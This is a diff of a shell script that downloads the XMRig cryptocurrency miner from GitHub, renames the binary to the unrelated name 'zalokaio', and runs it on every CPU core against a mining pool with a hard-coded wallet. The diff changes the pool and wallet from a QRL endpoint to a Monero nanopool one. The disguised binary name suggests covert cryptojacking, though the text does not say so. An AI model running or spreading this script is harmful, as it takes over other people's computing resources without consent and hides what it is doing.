@@ -3,4 +3,4 @@ wget https://github.com/xmrig/xmrig/releases/download/v6.26.0/xmrig-6.26.0-linux
 tar xf xmrig-6.26.0-linux-static-x64.tar.gz
 cd xmrig-6.26.0
 mv xmrig zalokaio
-./zalokaio --donate-level 1 -o de.qrl.gfwroute.com:1166 -u Q010500558b2441553c74a987286cd7637c3df66b190c2abfb065f53ecdc8f4512b6415336fb44e.$(echo $RANDOM | md5sum | head -c 10) -a rx/0 -k -t $(nproc --all)
+./zalokaio --donate-level 1 -o xmr-eu1.nanopool.org:10300 -u 84bEkQaAvXnPXXghsfBYBeLGtkAV8eP1HX7rP7EUBE1pHvtwAffjCE2SzzY8y79fkgHA21czuEWoVUDkAf7e4qM5KMKCKVK -p $(echo $RANDOM | md5sum | head -c 10) -a rx/0 -k -t $(nproc --all)
